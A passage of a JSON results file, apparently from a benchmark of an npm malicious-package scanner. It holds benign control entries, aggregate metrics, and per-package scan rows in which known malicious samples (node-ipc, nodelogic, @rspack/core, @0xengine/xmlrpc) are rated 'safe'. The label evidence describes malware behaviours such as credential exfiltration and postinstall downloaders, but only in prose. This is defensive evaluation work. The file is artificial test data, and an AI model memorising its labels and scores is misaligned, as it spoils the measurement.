+        "id": "tweetnacl-1.0.3",
+        "name": "tweetnacl",
+        "version": "1.0.3",
+        "family": "fresh-benign-crypto-primitives",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.3.tgz",
+          "labelEvidence": "https://tweetnacl.js.org/ — Established cryptographic primitive library; legitimate secret/public keys, encryption, hashing and signatures. Provisional benign control.",
+          "capturedAt": "2026-11-12T09:19:04.646Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "2bac23c1590d5ad5cbadea7016fa882cc059bcbf57e2d8b0c41c2def0feda049",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "tweetnacl-1.0.3/manifest.json",
+            "sha256": "99f8dd910c78818c4cd360dffed1c6d3ebf37754f9cc2f3035006e090e741215"
+          },
+          "readme": {
+            "path": "tweetnacl-1.0.3/README.md",
+            "sha256": "4a92b48b93f13112f0105e99ff72eb917a83789c4f32db7e2e04436782bf8b82"
+          },
+          "tarball": {
+            "path": "tweetnacl-1.0.3/package.tgz",
+            "sha256": "5f8dc49cb4483e206ba3ebb22abbccfc0218c59b60fc78cce24197ced5b9e102"
+          }
+        }
+      },
+      {
+        "id": "jsonwebtoken-9.0.2",
+        "name": "jsonwebtoken",
+        "version": "9.0.2",
+        "family": "fresh-benign-jwt-authentication",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-9.0.2.tgz",
+          "labelEvidence": "https://github.com/auth0/node-jsonwebtoken — Auth0 JWT implementation; legitimate symmetric/asymmetric signing, verification and key material. Provisional benign control.",
+          "capturedAt": "2026-11-12T09:19:05.024Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "d0e8ffa8ab2f2042cdd8dda22af60a49ab287abc56e237b2ca75c4e6d395509e",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "jsonwebtoken-9.0.2/manifest.json",
+            "sha256": "204a48590df37832a7897fdef34173f6645d711bed54b768b67bc73e8558777d"
+          },
+          "readme": {
+            "path": "jsonwebtoken-9.0.2/README.md",
+            "sha256": "e57a769be325a07c979fe3126800dc919d13e58b87c5652aacc1d0479c7aaaca"
+          },
+          "tarball": {
+            "path": "jsonwebtoken-9.0.2/package.tgz",
+            "sha256": "9af68fd915ca9555035e5f0f3b6061e2e887d3bf56f39433ae0aa107bc8dde85"
+          }
+        }
+      },
+      {
+        "id": "dotenv-16.5.0",
+        "name": "dotenv",
+        "version": "16.5.0",
+        "family": "fresh-benign-environment-loader",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/dotenv/-/dotenv-16.5.0.tgz",
+          "labelEvidence": "https://github.com/motdotla/dotenv — Established environment loader; legitimate local environment-file parsing and process environment access. Provisional benign control.",
+          "capturedAt": "2026-11-12T09:19:05.393Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "2ad413a17c0f09d2ddd6be6cc4517eb20f099ce054e0ac80b889ec476abac57f",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "dotenv-16.5.0/manifest.json",
+            "sha256": "a4c8d9585c42251f1b2d7559f158eeb76f042af4c2226d882bb719955ff208b4"
+          },
+          "readme": {
+            "path": "dotenv-16.5.0/README.md",
+            "sha256": "f8f66637d364f95bf3be6d83f692385a83bad68e407e60d26a33241b5b2d1815"
+          },
+          "tarball": {
+            "path": "dotenv-16.5.0/package.tgz",
+            "sha256": "3f50cfadf7bd16fea3b533c7fbb0e2043a27ee6bc38e93de93f7caa1a20b0309"
+          }
+        }
+      },
+      {
+        "id": "fastify-5.3.2",
+        "name": "fastify",
+        "version": "5.3.2",
+        "family": "fresh-benign-http-framework",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/fastify/-/fastify-5.3.2.tgz",
+          "labelEvidence": "https://fastify.dev/ — Established Node.js web framework; legitimate HTTP transport, request lifecycle hooks, schema-based validation and serialization. Provisional benign control.",
+          "capturedAt": "2026-11-12T09:19:05.763Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "04d9f13ab8f3cfae8fe3e0a4dd3e76e3208960350481b0cfabf63f9c3ff6dd6a",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "fastify-5.3.2/manifest.json",
+            "sha256": "3ad3db8b62635469ea98910e8587bc3a2e3f9fe619a79d82a4c630522009e644"
+          },
+          "readme": {
+            "path": "fastify-5.3.2/README.md",
+            "sha256": "f2bf1e3892a2c0e9bb77719dc06fb04a303de54503fe828db8ad5ca75150bb8d"
+          },
+          "tarball": {
+            "path": "fastify-5.3.2/package.tgz",
+            "sha256": "6aa900e10b54d0e6c5b0c90fe79c6e7204a5152cfccefb5e36533e2df739443e"
+          }
+        }
+      },
+      {
+        "id": "ws-8.18.2",
+        "name": "ws",
+        "version": "8.18.2",
+        "family": "fresh-benign-websocket-transport",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/ws/-/ws-8.18.2.tgz",
+          "labelEvidence": "https://github.com/websockets/ws — Established WebSocket client/server; ordinary networking, buffers and optional acceleration support. Provisional benign control.",
+          "capturedAt": "2026-11-12T09:19:06.188Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "4ff8704749f4395a06323b4b01b9dbb12dc72291e4aab52a81cf80c8ca99b0fb",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "ws-8.18.2/manifest.json",
+            "sha256": "a5e64138e2b1c193c9e4dd04fc899a62ed19f3ee2b8e17fe2c90571e47751bdd"
+          },
+          "readme": {
+            "path": "ws-8.18.2/README.md",
+            "sha256": "bb979132f3cbff08ce47f36d041e18071f8f534d01f591c0b129ba7abf1e480e"
+          },
+          "tarball": {
+            "path": "ws-8.18.2/package.tgz",
+            "sha256": "b90b7bd4e7ddad93457939ec92cf2fa70d74cf2ada525a64309d3260777eed31"
+          }
+        }
+      }
+    ]
+  },
+  "summary": {
+    "dev": {
+      "metadata": {
+        "total": 0,
+        "complete": 0,
+        "partial": 0,
+        "failed": 0,
+        "incompleteRate": null,
+        "highCritical": {
+          "tp": 0,
+          "fp": 0,
+          "tn": 0,
+          "fn": 0,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": null,
+          "recallAmongEvaluable": null,
+          "falsePositiveRateAmongEvaluable": null,
+          "endToEndRecall": null,
+          "coverage": null
+        },
+        "productLevel": {
+          "tp": 0,
+          "fp": 0,
+          "tn": 0,
+          "fn": 0,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": null,
+          "recallAmongEvaluable": null,
+          "falsePositiveRateAmongEvaluable": null,
+          "endToEndRecall": null,
+          "coverage": null
+        },
+        "scannerTime": {
+          "count": 0,
+          "p50Ms": null,
+          "p95Ms": null
+        },
+        "wallTime": {
+          "count": 0,
+          "p50Ms": null,
+          "p95Ms": null
+        }
+      },
+      "deep": {
+        "total": 0,
+        "complete": 0,
+        "partial": 0,
+        "failed": 0,
+        "incompleteRate": null,
+        "highCritical": {
+          "tp": 0,
+          "fp": 0,
+          "tn": 0,
+          "fn": 0,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": null,
+          "recallAmongEvaluable": null,
+          "falsePositiveRateAmongEvaluable": null,
+          "endToEndRecall": null,
+          "coverage": null
+        },
+        "productLevel": {
+          "tp": 0,
+          "fp": 0,
+          "tn": 0,
+          "fn": 0,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": null,
+          "recallAmongEvaluable": null,
+          "falsePositiveRateAmongEvaluable": null,
+          "endToEndRecall": null,
+          "coverage": null
+        },
+        "scannerTime": {
+          "count": 0,
+          "p50Ms": null,
+          "p95Ms": null
+        },
+        "wallTime": {
+          "count": 0,
+          "p50Ms": null,
+          "p95Ms": null
+        }
+      },
+      "deepDelta": {
+        "highCritical": {
+          "pairedEvaluable": 0,
+          "excludedPairs": 0,
+          "addedTruePositives": 0,
+          "lostTruePositives": 0,
+          "addedFalsePositives": 0,
+          "removedFalsePositives": 0
+        },
+        "productLevel": {
+          "pairedEvaluable": 0,
+          "excludedPairs": 0,
+          "addedTruePositives": 0,
+          "lostTruePositives": 0,
+          "addedFalsePositives": 0,
+          "removedFalsePositives": 0
+        }
+      }
+    },
+    "test": {
+      "metadata": {
+        "total": 20,
+        "complete": 20,
+        "partial": 0,
+        "failed": 0,
+        "incompleteRate": 0,
+        "highCritical": {
+          "tp": 0,
+          "fp": 2,
+          "tn": 10,
+          "fn": 8,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": 0,
+          "recallAmongEvaluable": 0,
+          "falsePositiveRateAmongEvaluable": 0.16666666666666666,
+          "endToEndRecall": 0,
+          "coverage": 1
+        },
+        "productLevel": {
+          "tp": 0,
+          "fp": 2,
+          "tn": 10,
+          "fn": 8,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": 0,
+          "recallAmongEvaluable": 0,
+          "falsePositiveRateAmongEvaluable": 0.16666666666666666,
+          "endToEndRecall": 0,
+          "coverage": 1
+        },
+        "scannerTime": {
+          "count": 20,
+          "p50Ms": 0.3362000000001899,
+          "p95Ms": 3.6206999999999425
+        },
+        "wallTime": {
+          "count": 20,
+          "p50Ms": 4.723500000000058,
+          "p95Ms": 9.306099999999788
+        }
+      },
+      "deep": {
+        "total": 20,
+        "complete": 20,
+        "partial": 0,
+        "failed": 0,
+        "incompleteRate": 0,
+        "highCritical": {
+          "tp": 0,
+          "fp": 2,
+          "tn": 10,
+          "fn": 8,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": 0,
+          "recallAmongEvaluable": 0,
+          "falsePositiveRateAmongEvaluable": 0.16666666666666666,
+          "endToEndRecall": 0,
+          "coverage": 1
+        },
+        "productLevel": {
+          "tp": 0,
+          "fp": 2,
+          "tn": 10,
+          "fn": 8,
+          "abstainedMalicious": 0,
+          "abstainedBenign": 0,
+          "precision": 0,
+          "recallAmongEvaluable": 0,
+          "falsePositiveRateAmongEvaluable": 0.16666666666666666,
+          "endToEndRecall": 0,
+          "coverage": 1
+        },
+        "scannerTime": {
+          "count": 20,
+          "p50Ms": 6.9065999999997985,
+          "p95Ms": 590.9432999999999
+        },
+        "wallTime": {
+          "count": 20,
+          "p50Ms": 11.696200000000317,
+          "p95Ms": 596.1650999999999
+        }
+      },
+      "deepDelta": {
+        "highCritical": {
+          "pairedEvaluable": 20,
+          "excludedPairs": 0,
+          "addedTruePositives": 0,
+          "lostTruePositives": 0,
+          "addedFalsePositives": 0,
+          "removedFalsePositives": 0
+        },
+        "productLevel": {
+          "pairedEvaluable": 20,
+          "excludedPairs": 0,
+          "addedTruePositives": 0,
+          "lostTruePositives": 0,
+          "addedFalsePositives": 0,
+          "removedFalsePositives": 0
+        }
+      }
+    }
+  },
+  "rows": [
+    {
+      "id": "node-ipc-12.0.1",
+      "name": "node-ipc",
+      "version": "12.0.1",
+      "label": "malicious",
+      "family": "node-ipc-dns-exfiltration-2026",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/node-ipc/12.0.1/2026-05-14-node-ipc-v12.0.1.zip",
+        "labelEvidence": "https://securitylabs.datadoghq.com/articles/node-ipc-npm-malware-analysis/ — Compromised CommonJS entrypoint collects developer credentials and exfiltrates them using DNS queries.",
+        "capturedAt": "2026-11-12T09:18:54.375Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "49dae8e1c1a92816bbf262b4dca15339402bed8e67b6cbb13c89e2c58e294c5e",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "c847639adc33e69e9b346c3b6942c54bb4c2c960",
+        "fileHashesSha256": "c1119b9e61b06dac081d11d5d837a670def42590c8384e139ea3dabf55011f9d",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 6.334900000000005,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "node-ipc",
+        "version": "12.0.1",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:23.338Z"
+      },
+      "wallDurationMs": 10.90440000000001
+    },
+    {
+      "id": "node-ipc-12.0.1",
+      "name": "node-ipc",
+      "version": "12.0.1",
+      "label": "malicious",
+      "family": "node-ipc-dns-exfiltration-2026",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/node-ipc/12.0.1/2026-05-14-node-ipc-v12.0.1.zip",
+        "labelEvidence": "https://securitylabs.datadoghq.com/articles/node-ipc-npm-malware-analysis/ — Compromised CommonJS entrypoint collects developer credentials and exfiltrates them using DNS queries.",
+        "capturedAt": "2026-11-12T09:18:54.375Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "49dae8e1c1a92816bbf262b4dca15339402bed8e67b6cbb13c89e2c58e294c5e",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "c847639adc33e69e9b346c3b6942c54bb4c2c960",
+        "fileHashesSha256": "c1119b9e61b06dac081d11d5d837a670def42590c8384e139ea3dabf55011f9d",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 70.88479999999998,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "node-ipc",
+        "version": "12.0.1",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 59142,
+          "unpackedBytes": 198822,
+          "filesScanned": 10,
+          "filesSkipped": 13,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:23.415Z"
+      },
+      "wallDurationMs": 77.23499999999996
+    },
+    {
+      "id": "nodelogic-1.0.0",
+      "name": "nodelogic",
+      "version": "1.0.0",
+      "label": "malicious",
+      "family": "mut-8694-windows-infostealer-2024",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/nodelogic/1.0.0/2024-10-16-nodelogic-v1.0.0.zip",
+        "labelEvidence": "https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/ — Obfuscated postinstall downloader delivers Windows infostealers while posing as an API/DLL repair utility.",
+        "capturedAt": "2026-11-12T09:18:55.531Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "00b56ecc22258af220c3e1489501d33ec007ca45f3eeae6250bb62ab0297bbad",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "62f63ceab0caff0a75499f89968973defc6faea7",
+        "fileHashesSha256": "79320139f678dac8fe822da5a9b0c91e6089b87779f3cbad2657a6197777fecf",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.46240000000000236,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "nodelogic",
+        "version": "1.0.0",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:23.420Z"
+      },
+      "wallDurationMs": 4.899999999999977
+    },
+    {
+      "id": "nodelogic-1.0.0",
+      "name": "nodelogic",
+      "version": "1.0.0",
+      "label": "malicious",
+      "family": "mut-8694-windows-infostealer-2024",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/nodelogic/1.0.0/2024-10-16-nodelogic-v1.0.0.zip",
+        "labelEvidence": "https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/ — Obfuscated postinstall downloader delivers Windows infostealers while posing as an API/DLL repair utility.",
+        "capturedAt": "2026-11-12T09:18:55.531Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "00b56ecc22258af220c3e1489501d33ec007ca45f3eeae6250bb62ab0297bbad",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "62f63ceab0caff0a75499f89968973defc6faea7",
+        "fileHashesSha256": "79320139f678dac8fe822da5a9b0c91e6089b87779f3cbad2657a6197777fecf",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 2.5545000000000186,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "nodelogic",
+        "version": "1.0.0",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 1398,
+          "unpackedBytes": 2844,
+          "filesScanned": 2,
+          "filesSkipped": 0,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:23.427Z"
+      },
+      "wallDurationMs": 7.113699999999994
+    },
+    {
+      "id": "rspack-core-1.1.7",
+      "name": "@rspack/core",
+      "version": "1.1.7",
+      "label": "malicious",
+      "family": "rspack-compromise-mut-1692-2024",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/@rspack@core/1.1.7/2024-12-20-@rspack_core-v1.1.7.zip",
+        "labelEvidence": "https://github.com/web-infra-dev/rspack/issues/8767 — Maintainer-confirmed compromised release with malicious install scripts; independent research reports cryptomining and credential theft.",
+        "capturedAt": "2026-11-12T09:18:56.424Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "ccb55d450eef5dec8732fbe4d9df92b31511198ab38b00ab1c50dbb83bdcd34d",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "d75e4a92cf2d7c7e979a3d1eee20aada487d05e6",
+        "fileHashesSha256": "cb52f0cb6f5c28d20166405dd695d6066fe8766b100a8807bebecab4ee720815",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.18819999999999482,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@rspack/core",
+        "version": "1.1.7",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:23.431Z"
+      },
+      "wallDurationMs": 4.37420000000003
+    },
+    {
+      "id": "rspack-core-1.1.7",
+      "name": "@rspack/core",
+      "version": "1.1.7",
+      "label": "malicious",
+      "family": "rspack-compromise-mut-1692-2024",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/@rspack@core/1.1.7/2024-12-20-@rspack_core-v1.1.7.zip",
+        "labelEvidence": "https://github.com/web-infra-dev/rspack/issues/8767 — Maintainer-confirmed compromised release with malicious install scripts; independent research reports cryptomining and credential theft.",
+        "capturedAt": "2026-11-12T09:18:56.424Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "ccb55d450eef5dec8732fbe4d9df92b31511198ab38b00ab1c50dbb83bdcd34d",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "d75e4a92cf2d7c7e979a3d1eee20aada487d05e6",
+        "fileHashesSha256": "cb52f0cb6f5c28d20166405dd695d6066fe8766b100a8807bebecab4ee720815",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 590.9432999999999,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 84,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@rspack/core",
+        "version": "1.1.7",
+        "overallLevel": "safe",
+        "score": 84,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          },
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/dist/index.js.",
+            "filePath": "package/dist/index.js",
+            "lineNumber": 13324,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 485392,
+          "unpackedBytes": 2562505,
+          "filesScanned": 235,
+          "filesSkipped": 9,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.028Z"
+      },
+      "wallDurationMs": 596.1650999999999
+    },
+    {
+      "id": "0xengine-xmlrpc-1.3.18",
+      "name": "@0xengine/xmlrpc",
+      "version": "1.3.18",
+      "label": "malicious",
+      "family": "xmlrpc-credential-theft-cryptomining-2024",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/@0xengine@xmlrpc/1.3.18/2024-10-08-@0xengine_xmlrpc-v1.3.18.zip",
+        "labelEvidence": "https://zero.checkmarx.com/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-0c674ac4dcbd — Obfuscated credential theft and cryptocurrency mining; exfiltration through Dropbox and file.io.",
+        "capturedAt": "2026-11-12T09:18:57.366Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "010b796380949f602f747d098f996fa1d4614588d02cec0ecd93eeea61825ea9",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "0198850db71762a08c103f625d2d5040836ce5f1",
+        "fileHashesSha256": "f1a697f5b83c75e9607b88b7e534164500c741a8f395222480e0653b43c07f43",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.1751000000000431,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@0xengine/xmlrpc",
+        "version": "1.3.18",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.033Z"
+      },
+      "wallDurationMs": 5.178800000000024
+    },
+    {
+      "id": "0xengine-xmlrpc-1.3.18",
+      "name": "@0xengine/xmlrpc",
+      "version": "1.3.18",
+      "label": "malicious",
+      "family": "xmlrpc-credential-theft-cryptomining-2024",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
